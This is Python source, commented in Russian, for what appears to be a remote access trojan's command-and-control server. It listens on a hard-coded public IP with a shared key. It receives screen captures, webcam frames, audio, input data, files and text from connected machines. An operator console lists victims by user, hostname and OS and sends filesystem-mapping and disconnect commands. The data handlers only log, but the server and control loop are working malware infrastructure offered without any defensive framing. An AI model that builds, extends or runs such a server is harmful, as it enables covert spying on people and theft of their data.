import asyncio
import json
import multiprocessing
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from loguru import logger

IP = "188.190.156.120"
PORT = 50050
AUTH_KEY = "super_secret"

clients = {}
clients_info = {}
FSmap = {}

module_queue = multiprocessing.Queue()

def screen_watch(data: bytes):
    logger.info(f"[ScreenWatch] Получен кадр экрана ({len(data)} байт)")


def input_forge(data: bytes):
    logger.info(f"[InputForge] Получены команды ввода ({len(data)} байт)")


def echo_tap(data: bytes):
    logger.info(f"[EchoTap] Получен аудиопоток ({len(data)} байт)")


def cam_gaze(data: bytes):
    logger.info(f"[CamGaze] Получен кадр с веб-камеры ({len(data)} байт)")


def bin_stream(data: bytes):
    logger.info(f"[BinStream] Получен бинарный файл/папка ({len(data)} байт)")


def data_scribe(data: bytes):
    try:
        text = data.decode("utf-8")
        logger.info(f"[DataScribe] Получены текстовые данные: {text[:50]}{'...' if len(text) > 50 else ''}")
    except UnicodeDecodeError:
        logger.info("[DataScribe] Ошибка декодирования текста")


module_map = {
    "DataScribe": data_scribe,
    "ScreenWatch": screen_watch,
    "BinStream": bin_stream,
    "EchoTap": echo_tap,
    "CamGaze": cam_gaze,
    "InputForge": input_forge,
}


def module_worker():
    logger.info(f"[+] Процесс module_worker {multiprocessing.current_process().name} запущен")

    while True:
        try:
            client_id, module_name, payload_bytes = module_queue.get()
            func = module_map.get(module_name)
            if func:
                try:
                    func(payload_bytes)
                except Exception as e:
                    logger.info(f"[Модуль {module_name} клиент {client_id}] Ошибка: {e}")
            else:
                logger.info(f"[!] Неизвестный модуль: {module_name} от клиента {client_id}")
        except Exception as e:
            logger.info(f"[module_worker] Общая ошибка: {e}")


async def close_client(client_id, send_sleep=True):
    if client_id in clients:
        _, writer = clients[client_id]
        try:
            if send_sleep:
                writer.write(b"sleep\n")
                await writer.drain()
        except Exception:
            pass
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        clients.pop(client_id, None)
        clients_info.pop(client_id, None)
        logger.info(f"[*] Соединение клиента {client_id} закрыто.")


async def close_all_clients():
    for cid in list(clients.keys()):
        await close_client(cid)


async def authorize_client(reader: asyncio.StreamReader):
    try:
        name_len_bytes = await asyncio.wait_for(reader.readexactly(1), timeout=10)
        name_len = name_len_bytes[0]

        module_name = (await asyncio.wait_for(reader.readexactly(name_len), timeout=10)).decode("utf-8")

        payload_len_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=10)
        payload_len = int.from_bytes(payload_len_bytes, "big")

        payload_bytes = await asyncio.wait_for(reader.readexactly(payload_len), timeout=10)

        if module_name != "AuthModule":
            logger.info("[!] Первый модуль должен быть AuthModule")
            return None, None

        payload = json.loads(payload_bytes.decode("utf-8"))

        if payload.get("auth_key") != AUTH_KEY:
            logger.info("[!] Неверный ключ от клиента")
            return None, None

        client_id = payload.get("client_id")
        if not isinstance(client_id, str):
            logger.info("[!] Неверный client_id")
            return None, None

        info = payload.get("info", {})
        if not isinstance(info, dict):
            logger.info("[!] Поле info не является словарём")
            return None, None

        return client_id, info

    except Exception as e:
        logger.info(f"[!] Ошибка авторизации: {e}")
        return None, None


async def read_module(reader: asyncio.StreamReader):
    try:
        name_len_bytes = await reader.readexactly(1)
        name_len = name_len_bytes[0]

        module_name = (await reader.readexactly(name_len)).decode("utf-8")

        payload_len_bytes = await reader.readexactly(4)
        payload_len = int.from_bytes(payload_len_bytes, "big")

        payload_bytes = await reader.readexactly(payload_len)

        return module_name, payload_bytes

    except asyncio.IncompleteReadError:
        return None, None
    except Exception as e:
        logger.info(f"[!] Ошибка чтения модуля: {e}")
        return None, None


async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    client_id = None
    addr = writer.get_extra_info('peername')

    try:
        client_id, info = await authorize_client(reader)
        if not client_id:
            writer.close()
            await writer.wait_closed()
            return

        if client_id in clients:
            await close_client(client_id, send_sleep=False)

        clients[client_id] = (reader, writer)
        clients_info[client_id] = info
        logger.info(f"[+] Клиент {client_id} подключился: {addr}")

        while True:
            try:
                module_name, payload_bytes = await read_module(reader)
                if not module_name or payload_bytes is None:
                    break

                module_queue.put_nowait((client_id, module_name, payload_bytes))

            except asyncio.IncompleteReadError:
                break
            except Exception as e:
                logger.info(f"[Клиент {client_id}] Ошибка чтения модуля: {e}")
                break

    finally:
        if client_id:
            clients.pop(client_id, None)
            clients_info.pop(client_id, None)
            FSmap.pop(client_id, None)
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        logger.info(f"[Клиент {client_id or '?'}] Отключился")


async def operator_interface(server):
    session = PromptSession()

    while True:
        with patch_stdout():
            selected_str = await session.prompt_async(
                """
Введите ID клиента или команду:
  '0' — выход
  'sleep <id>' — отключить клиента
  'sleep_all' — отключить всех
  'list' — показать подключённых
  >> """
            )

        selected_str = selected_str.strip()

        if selected_str == "0":
            logger.info("[*] Завершение работы. Закрываем соединения...")
            await close_all_clients()
            server.close()
            await server.wait_closed()
            logger.info("[*] Сервер завершил работу.")
            break

        elif selected_str == "list":
            if not clients_info:
                logger.info("[!] Нет подключённых клиентов.")
            else:
                logger.info("\n[Подключённые клиенты]")
                for cid, info in clients_info.items():
                    reader, writer = clients[cid]
                    peername = writer.get_extra_info('peername')
                    ip, port = peername if peername else ("?", "?")
                    os_str = info.get("os", "?")
                    user = info.get("user", "?")
                    host = info.get("hostname", "?")
                    arch = info.get("arch", "?")
                    logger.info(f"[{ip}:{port}] ┃ ID {cid} ┃ {os_str} ┃ {user}@{host} ┃ {arch}")
                logger.info("============================================================")

        elif selected_str.startswith("sleep "):
            cid = selected_str[6:].strip()
            if cid in clients:
                await close_client(cid)
                logger.info(f"[*] Клиент {cid} отключён.")
            else:
                logger.info("[!] Клиент не найден.")

        elif selected_str == "sleep_all":
            await close_all_clients()
            logger.info("[*] Все клиенты отключены.")

        elif selected_str in clients:
            cid = selected_str
            logger.info(f"[*] Вход в режим клиента {cid}. Доступные команды: FSmap, sleep, back")
            while True:
                if cid not in clients:
                    logger.info(f"[!] Клиент {cid} отключился. Возвращаемся в глобальный режим.")
                    break

                with patch_stdout():
                    cmd = await session.prompt_async(f"[{cid}] client> ")
                cmd = cmd.strip()
                if not cmd:
                    continue

                if cmd == "back":
                    if cid in clients:
                        _, writer = clients[cid]
                        try:
                            writer.write(b"back\n")  # <-- отправляем клиенту команду
                            await writer.drain()
                            logger.info(f"[*] Команда 'back' отправлена клиенту {cid}.")
                        except Exception as e:
                            logger.info(f"[!] Ошибка при отправке 'back' клиенту {cid}: {e}")
                    logger.info("[*] Возвращаемся в глобальный режим.")
                    break

                if cmd == "sleep":
                    if cid in clients:
                        _, writer = clients[cid]
                        try:
                            writer.write(b"sleep\n")
                            await writer.drain()
                        except Exception as e:
                            logger.info(f"[!] Не удалось отправить sleep: {e}")
                        await close_client(cid)
                        logger.info(f"[*] Клиент {cid} отключён.")
                    else:
                        logger.info("[!] Клиент уже отсутствует.")
                    break

                if cmd == "FSmap":
                    if cid in clients:
                        _, writer = clients[cid]
                        try:
                            writer.write(b"FSmap\n")
                            await writer.drain()
                            logger.info(f"[*] Команда 'FSmap' отправлена клиенту {cid}.")
                        except Exception as e:
                            logger.info(f"[!] Ошибка при отправке 'FSmap' клиенту {cid}: {e}")
                    else:
                        logger.info("[!] Клиент отключился прежде чем команда была отправлена.")
                    continue

                logger.info("[!] Неизвестная команда в режиме клиента. Поддерживаемые: FSmap, sleep, back.")


async def start_server():
    server = await asyncio.start_server(client_handler, IP, PORT, reuse_address=True, backlog=1000)
    addr = server.sockets[0].getsockname()
    logger.info(f"[+] Сервер слушает на {addr}")

    num_workers = 8
    processes = []
    for _ in range(num_workers):
        p = multiprocessing.Process(target=module_worker)
        p.start()
        processes.append(p)

    operator_task = asyncio.create_task(operator_interface(server))

    async with server:
        try:
            await asyncio.gather(server.serve_forever(), operator_task)
        except asyncio.CancelledError:
            logger.info("[*] Сервер остановлен корректно.")
        finally:
            for p in processes:
                p.terminate()
                p.join()


if __name__ == "__main__":
    try:
        asyncio.run(start_server())
    except KeyboardInterrupt:
        logger.info("\n[*] Сервер остановлен вручную.")